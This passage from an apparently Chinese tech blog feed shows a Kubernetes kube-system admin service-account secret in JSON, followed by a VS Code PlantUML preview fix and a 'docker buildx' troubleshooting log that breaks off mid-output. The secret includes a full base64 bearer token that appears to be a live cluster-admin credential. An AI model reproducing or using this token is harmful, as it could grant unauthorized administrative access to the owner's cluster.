<span class="hljs-string">&quot;2962635&quot;</span>,<br>    <span class="hljs-string">&quot;creationTimestamp&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>    <span class="hljs-string">&quot;annotations&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.uid&quot;</span>: <span class="hljs-string">&quot;4fe95396-6de8-4097-9ff9-4232f0151c71&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;managedFields&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;manager&quot;</span>: <span class="hljs-string">&quot;kube-controller-manager&quot;</span>,<br>        <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;Update&quot;</span>,<br>        <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>        <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsType&quot;</span>: <span class="hljs-string">&quot;FieldsV1&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsV1&quot;</span>: &#123;<span class="hljs-string">&quot;f:data&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:ca.crt&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:namespace&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:token&quot;</span>:&#123;&#125;&#125;,<span class="hljs-string">&quot;f:metadata&quot;</span>:&#123;<span class="hljs-string">&quot;f:annotations&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.name&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.uid&quot;</span>:&#123;&#125;&#125;&#125;,<span class="hljs-string">&quot;f:type&quot;</span>:&#123;&#125;&#125;<br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ca.crt&quot;</span>: <span class="hljs-string">&quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;a3ViZS1zeXN0ZW0=&quot;</span>,<br>    <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=&quot;</span>   <span class="hljs-comment"># base64编码后的</span><br>  &#125;,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;kubernetes.io/service-account-token&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://jimmysong.io/kubernetes-handbook/guide/auth-with-kubeconfig-or-token.html#%E7%94%9F%E6%88%90kubernetes%E9%9B%86%E7%BE%A4%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90admin%E7%94%A8%E6%88%B7%E7%9A%84token">使用 kubeconfig 或 token 进行用户身份认证</a><br><a href="https://support.huaweicloud.com/api-cce/cce_02_0045.html">获取Secret信息</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】(202402) plantuml无法正常显示预览</title>
    <link href="/2024/02/21/software/%E3%80%90vscode%E3%80%91(202402)%20plantuml%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E9%A2%84%E8%A7%88/"/>
    <url>/2024/02/21/software/%E3%80%90vscode%E3%80%91(202402)%20plantuml%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E9%A2%84%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-literal">Error</span><span class="hljs-operator">:</span> plantuml.jar file <span class="hljs-built_in">not</span> found<span class="hljs-operator">:</span> &quot;&quot;<br><br>Please download plantuml.jar from https<span class="hljs-operator">:</span><span class="hljs-comment">//plantuml.com/download.  </span><br><br><br>If you are <span class="hljs-built_in">using</span> VSCode <span class="hljs-keyword">or</span> coc.nvim, <span class="hljs-keyword">then</span> please <span class="hljs-built_in">set</span> the setting <span class="hljs-string">&quot;markdown-preview-enhanced.plantumlJarPath&quot;</span> <span class="hljs-keyword">to</span> the absolute path <span class="hljs-keyword">of</span> plantuml.jar file.<br><br>If you don&#x27;t want <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> plantuml.jar, <span class="hljs-keyword">then</span> you can <span class="hljs-keyword">use</span> the online plantuml server <br>by setting the setting <span class="hljs-string">&quot;markdown-preview-enhanced.plantumlServer&quot;</span> <span class="hljs-keyword">to</span> the URL <span class="hljs-keyword">of</span> the online plantuml server, <span class="hljs-keyword">for</span> example<span class="hljs-operator">:</span> https<span class="hljs-operator">:</span><span class="hljs-comment">//kroki.io/plantuml/svg/</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plantuml">@startuml <br>title 标题<br>participant &quot;a&quot; as a<br>participant &quot;b&quot; as b<br><br>-&gt; a : 123<br>a -&gt; b: 321<br><br>@enduml<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095215.png" alt="image.png"></p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095319.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095347.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【docker错误解决系列】 (202402) &#39;buildx&#39; is not a docker command.</title>
    <link href="/2024/02/20/k8s/%E3%80%90docker%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91%20(202402)%20&#39;buildx&#39;%20is%20not%20a%20docker%20command./"/>
    <url>/2024/02/20/k8s/%E3%80%90docker%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91%20(202402)%20&#39;buildx&#39;%20is%20not%20a%20docker%20command./</url>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker buildx</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br>[root@ningan ~]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        <br>[root@ningan ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="尝试1：修改-x2F-docker-x2F-config-json"><a href="#尝试1：修改-x2F-docker-x2F-config-json" class="headerlink" title="尝试1：修改~&#x2F;.docker &#x2F;config.json"></a>尝试1：修改~&#x2F;.docker &#x2F;config.json</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># mkdir ~/.docker </span><br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘/root/.docker’: File exists<br>[root@ningan ~]<span class="hljs-comment"># cd .docker/</span><br>[root@ningan .docker]<span class="hljs-comment"># ll</span><br>total 24<br>drwx------  3 root root  4096 Jan 23 14:20 ./<br>drwx------ 68 root root  4096 Feb 20 10:53 ../<br>-rw-------  1 root root   447 Jan 23 14:20 config.json<br>drwxr-xr-x 85 root root 12288 Jan 23 14:55 manifests/<br><br>[root@ningan ~]<span class="hljs-comment"># vi config.json</span><br>&#123;<br>  ...<br>  <span class="hljs-string">&quot;experimental&quot;</span>: <span class="hljs-string">&quot;enabled&quot;</span><br>&#125;<br>[root@ningan .docker]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan .docker]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        <br></code></pre></td></tr></table></figure><h2 id="尝试2：exporter-DOCKER-CLI-EXPERIMENTAL-x3D-enabled"><a href="#尝试2：exporter-DOCKER-CLI-EXPERIMENTAL-x3D-enabled" class="headerlink" title="尝试2：exporter DOCKER_CLI_EXPERIMENTAL&#x3D;enabled"></a>尝试2：exporter DOCKER_CLI_EXPERIMENTAL&#x3D;enabled</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan .docker]<span class="hljs-comment"># export DOCKER_CLI_EXPERIMENTAL=enabled</span><br>[root@ningan .docker]<span class="hljs-comment"># </span><br>[root@ningan .docker]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan .docker]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:   <br>[root@ningan .docker]<span class="hljs-comment"># docker info |grep Experimental</span><br>WARNING: No swap <span class="hljs-built_in">limit</span> support<br> Experimental: <span class="hljs-literal">false</span>     <br></code></pre></td></tr></table></figure><h2 id="尝试3：修改-x2F-etc-x2F-docker-x2F-daemon-json-–-gt-Experimental成功开启"><a href="#尝试3：修改-x2F-etc-x2F-docker-x2F-daemon-json-–-gt-Experimental成功开启" class="headerlink" title="尝试3：修改&#x2F;etc&#x2F;docker&#x2F;daemon.json   –&gt; Experimental成功开启"></a>尝试3：修改&#x2F;etc&#x2F;docker&#x2F;daemon.json   –&gt; Experimental成功开启</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan .docker]<span class="hljs-comment"># vi /etc/docker/daemon.json</span><br>&#123;<br>  <span class="hljs-string">&quot;experimental&quot;</span>: <span class="hljs-literal">true</span>,<br>  ...<br>&#125;<br>[root@ningan .docker]<span class="hljs-comment"># systemctl restart docker</span><br>[root@ningan .docker]<span class="hljs-comment"># docker info |grep Experimental</span><br>WARNING: No swap <span class="hljs-built_in">limit</span> support<br> Experimental: <span class="hljs-literal">true</span><br>[root@ningan ~]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">true</span>                      <span class="hljs-comment">###########################  这个地方变成true了</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:  <br>[root@ningan ~]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help      </span><br></code></pre></td></tr></table></figure><h2 id="尝试4：开启binfmt"><a href="#尝试4：开启binfmt" class="headerlink" title="尝试4：开启binfmt"></a>尝试4：开启binfmt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker run --rm --privileged tonistiigi/binfmt:latest --install all</span><br>Unable to find image <span class="hljs-string">&#x27;tonistiigi/binfmt:latest&#x27;</span> locally<br>latest: Pulling from tonistiigi/binfmt<br>8d4d64c318a5: Pull complete <br>e9c608ddc3cb: Pull complete <br>Digest: sha256:66e11bea77a5ea9d6f0fe79b57cd2b189b5d15b93a2bdb925be22949232e4e55<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> tonistiigi/binfmt:latest<br>installing: riscv64 OK<br>installing: mips64le OK<br>installing: ppc64le OK<br>installing: mips64 OK<br>installing: arm64 OK<br>installing: arm OK<br>installing: s390x OK<br>&#123;<br>  <span class="hljs-string">&quot;supported&quot;</span>: [<br>    <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/riscv64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/ppc64le&quot;</span>,<br>    <span class="hljs-string">&quot;linux/s390x&quot;</span>,<br>    <span class="hljs-string">&quot;linux/386&quot;</span>,<br>    <span class="hljs-string">&quot;linux/mips64le&quot;</span>,<br>    <span class="hljs-string">&quot;linux/mips64&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm/v7&quot;</span>,<br>    <span class="hljs-string">&quot;linux/arm/v6&quot;</span><br>  ],<br>  <span class="hljs-string">&quot;emulators&quot;</span>: [<br>    <span class="hljs-string">&quot;jar&quot;</span>,<br>    <span class="hljs-string">&quot;llvm-6.0-runtime.binfmt&quot;</span>,<br>    <span class="hljs-string">&quot;python2.7&quot;</span>,<br>    <span class="hljs-string">&quot;python3.6&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-aarch64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-arm&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-mips64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-mips64el&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-ppc64le&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-riscv64&quot;</span>,<br>    <span class="hljs-string">&quot;qemu-s390x&quot;</span><br>  ]<br>&#125;<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ls -l /proc/sys/fs/binfmt_misc/</span><br>total 0<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 jar<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 llvm-6.0-runtime.binfmt<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 python2.7<br>-rw-r--r-- 1 root root 0 Feb  4 21:40 python3.6<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-aarch64<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-arm<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-mips64<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-mips64el<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-ppc64le<br>-rw-r--r-- 1 root root 0 Feb 20 11:29 qemu-riscv64<br>-rw-r--r-- 1 root root 0 Feb 20 